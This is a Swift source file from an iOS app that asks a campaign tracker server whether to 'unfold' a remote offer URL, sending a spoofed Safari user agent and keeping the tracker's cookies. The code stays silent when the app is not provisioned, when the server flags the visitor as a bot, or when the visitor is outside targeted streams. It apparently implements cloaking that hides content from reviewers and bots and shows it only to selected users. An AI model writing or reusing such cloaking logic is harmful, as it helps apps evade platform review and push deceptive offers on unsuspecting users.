import Foundation

enum BeaconPing {
    private static let maxAttempts = 3
    private static let backoffSchedule: [UInt64] = [800_000_000, 2_000_000_000]

    static func probe(_ config: BeaconConfig) async -> BeaconBundle {
        let empty = BeaconBundle(outcome: config.idleOutcome, cookies: [])
        BeaconLog.write("probe start; provisioned=\(config.is_provisioned) host=\(config.trackerDomain) tokenPrefix=\(config.campaignToken.prefix(6))")
        guard config.is_provisioned else {
            BeaconLog.write("not provisioned → silent")
            return empty
        }
        guard let request = makeRequest(config) else {
            BeaconLog.write("makeRequest failed")
            return empty
        }
        BeaconLog.write("GET \(request.url?.absoluteString ?? "nil")")

        for attempt in 1...maxAttempts {
            switch await fetchData(request, window: config.probeWindow, attempt: attempt) {
            case .success(let payload):
                BeaconLog.write("payload \(payload.count) bytes (attempt \(attempt))")
                if let raw = String(data: payload.prefix(800), encoding: .utf8) {
                    BeaconLog.write("raw=\(raw)")
                }
                guard let answer = decode(payload) else {
                    BeaconLog.write("decode failed → giving up (server response shape unexpected)")
                    return empty
                }
                let bundle = interpret(answer, config: config)
                BeaconLog.write("outcome=\(bundle.outcome) cookies=\(bundle.cookies.count)")
                return bundle

            case .terminal(let reason):
                BeaconLog.write("terminal failure: \(reason) → silent (no retry)")
                return empty

            case .transient(let reason):
                BeaconLog.write("transient failure: \(reason) (attempt \(attempt)/\(maxAttempts))")
                if attempt < maxAttempts {
                    let delay = backoffSchedule[min(attempt - 1, backoffSchedule.count - 1)]
                    try? await Task.sleep(nanoseconds: delay)
                    continue
                }
                BeaconLog.write("retries exhausted → silent")
                return empty
            }
        }
        return empty
    }

    private enum FetchResult {
        case success(Data)
        case transient(String)
        case terminal(String)
    }

    private static func makeRequest(_ config: BeaconConfig) -> URLRequest? {
        guard let url = config.probeURL else { return nil }
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = config.probeWindow
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.setValue(probeAgent, forHTTPHeaderField: "User-Agent")
        return request
    }

    private static func fetchData(_ request: URLRequest, window: TimeInterval, attempt: Int) async -> FetchResult {
        let session = URLSession(configuration: ephemeralSession(window: window))
        do {
            let (data, response) = try await session.data(for: request)
            guard let http = response as? HTTPURLResponse else {
                return .transient("no-http-response")
            }
            BeaconLog.write("HTTP \(http.statusCode) (attempt \(attempt))")
            switch http.statusCode {
            case 200...299:
                return .success(data)
            case 401, 403, 409:
                return .terminal("auth/disabled \(http.statusCode)")
            case 404, 410:
                return .terminal("not-found \(http.statusCode)")
            case 408, 425, 429, 500, 502, 503, 504:
                return .transient("retryable \(http.statusCode)")
            case 400...499:
                return .terminal("client \(http.statusCode)")
            default:
                return .transient("status \(http.statusCode)")
            }
        } catch {
            let nsErr = error as NSError
            if nsErr.domain == NSURLErrorDomain {
                switch nsErr.code {
                case NSURLErrorCancelled, NSURLErrorBadURL, NSURLErrorUnsupportedURL,
                     NSURLErrorAppTransportSecurityRequiresSecureConnection:
                    return .terminal("nsurl \(nsErr.code)")
                case NSURLErrorNotConnectedToInternet:
                    return .transient("offline")
                default:
                    return .transient("nsurl \(nsErr.code) \(nsErr.localizedDescription)")
                }
            }
            return .transient("error \(error)")
        }
    }

    private static func decode(_ data: Data) -> RemoteRelayAnswer? {
        try? JSONDecoder().decode(RemoteRelayAnswer.self, from: data)
    }

    private static func interpret(_ answer: RemoteRelayAnswer, config: BeaconConfig) -> BeaconBundle {
        let jar = answer.sessionCookies(host: config.trackerDomain)
        let empty = BeaconBundle(outcome: config.idleOutcome, cookies: jar)
        if let bot = answer.info?.is_bot, bot { return empty }
        if let targets = config.targetStreams, let sid = answer.info?.stream_id, !targets.contains(sid) {
            return empty
        }
        if let resolved = answer.resolvedURL {
            return BeaconBundle(outcome: .unfold(resolved), cookies: jar)
        }
        if let token = answer.unfoldToken, let built = config.offerURL(token: token) {
            return BeaconBundle(outcome: .unfold(built), cookies: jar)
        }
        return empty
    }

    private static func ephemeralSession(window: TimeInterval) -> URLSessionConfiguration {
        let cfg = URLSessionConfiguration.ephemeral
        cfg.timeoutIntervalForRequest = window
        cfg.timeoutIntervalForResource = window
        cfg.allowsCellularAccess = true
        cfg.waitsForConnectivity = false
        cfg.httpAdditionalHeaders = ["Accept-Language": Locale.preferredLanguages.first ?? "de"]
        return cfg
    }

    private static let probeAgent =
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
}

enum BeaconLog {
    static func write(_ message: String) {
        #if DEBUG
        print("[Beacon] \(message)")
        #endif
    }
}
